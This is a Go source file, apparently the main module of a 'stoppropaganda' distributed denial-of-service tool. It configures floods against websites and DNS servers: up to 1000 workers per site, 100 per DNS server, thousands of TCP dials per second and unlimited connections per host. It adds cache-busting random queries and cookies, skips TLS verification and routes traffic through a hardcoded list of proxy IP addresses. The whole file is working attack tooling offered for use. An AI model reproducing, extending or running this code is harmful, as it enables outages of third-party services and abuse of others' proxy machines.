package stoppropaganda

import (
	"crypto/tls"
	"flag"
	"log"
	"math"
	"math/rand"
	"net"
	"os"
	"runtime"
	"time"

	"github.com/km8oz/ddos-sttack/internal/customresolver"
	"github.com/km8oz/ddos-sttack/internal/customtcpdial"
	"github.com/km8oz/ddos-sttack/internal/sockshttp"
	"github.com/miekg/dns"
	"github.com/peterbourgon/ff/v3"
	"github.com/valyala/fasthttp"
)

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagAlgorithm       = fs.String("algorithm", "rr", "allowed algorithms are 'fair' and 'rr' (refer to README.md documentation)")
	flagAntiCache       = fs.Bool("anticache", true, "append randomly generated query and cookie to disrupt caching mechanisms")
	flagBind            = fs.String("bind", ":8049", "bind on specific host:port")
	flagDialConcurrency = fs.Int("dialconcurrency", 10000, "number of cuncurrent dial at any moment (from fasthttp)")
	flagDialsPerSecond  = fs.Int("dialspersecond", 4500, "maximum amount of TCP SYN packets sent per second (from fasthttp)")
	flagDNSTimeout      = fs.Duration("dnstimeout", time.Second, "timeout of DNS request")
	flagDNSWorkers      = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
	flagMaxProcs        = fs.Int("maxprocs", 1, "amount of threads used by Golang (runtime.GOMAXPROCS)")
	flagProxy           = fs.String("proxy", "176.195.56.113:8080,167.71.5.83:1080,176.195.56.37:8080,176.195.58.53:8080,172.67.0.10:80,203.32.120.39:80,185.162.230.220:80,91.226.97.116:80,203.24.108.29:80", "list of comma separated proxies to be used for websites DOS")
	flagProxyBypass     = fs.String("proxybypass", "", "list of comma separated IP addresses, CIDR ranges, zones (*.example.com) or a hostnames (e.g. localhost) that needs to bypass used proxy")
	flagTimeout         = fs.Duration("timeout", 120*time.Second, "timeout of HTTP request")
	flagUserAgent       = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
	flagWorkers         = fs.Int("workers", 1000, "DOS each website with this amount of workers")
)

func Start() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))
	log.Println("Starting...")
	runtime.GOMAXPROCS(*flagMaxProcs)

	initWebsites()
	initDNS()
	startWebsites()
	startDNS()

	log.Println("Started!")
	panic(fasthttp.ListenAndServe(*flagBind, fasthttpRequestHandler))
}

func init() {
	rand.Seed(time.Now().UnixNano())
	go tcpSynDialTicketsRoutine()
}

func initDNS() {
	// Create DNS client and dialer
	dnsClient = new(dns.Client)
	dnsClient.Dialer = &net.Dialer{
		Timeout: *flagDNSTimeout,
	}
}

func initWebsites() {
	// Create HTTP client
	httpClient = &fasthttp.Client{
		ReadTimeout:                   *flagTimeout,
		WriteTimeout:                  *flagTimeout,
		MaxIdleConnDuration:           time.Hour,
		NoDefaultUserAgentHeader:      true,
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		MaxConnsPerHost:               math.MaxInt,
		Dial:                          makeDialFunc(),
		TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
	}
}

func makeDialFunc() fasthttp.DialFunc {
	proxyChain, masterDialer := sockshttp.Initialize(*flagProxy, *flagProxyBypass, *flagTimeout)
	if len(proxyChain) > 0 {
		log.Printf("Proxy chain: %s", proxyChain)
	}
	myResolver := customresolver.MasterStopPropagandaResolver
	dial := (&customtcpdial.CustomTCPDialer{
		Concurrency:      *flagDialConcurrency,
		DNSCacheDuration: 5 * time.Minute,

		// stoppropaganda's implementation
		ParentDialer: masterDialer,
		Resolver:     myResolver,
		DialTicketsC: newConnTicketC,
	}).Dial
	return dial
}

var newConnTicketC = make(chan bool, 100)

func tcpSynDialTicketsRoutine() {
	perSecond := *flagDialsPerSecond
	interval := time.Second / time.Duration(perSecond)
	for {
		newConnTicketC <- true
		time.Sleep(interval)
	}
}
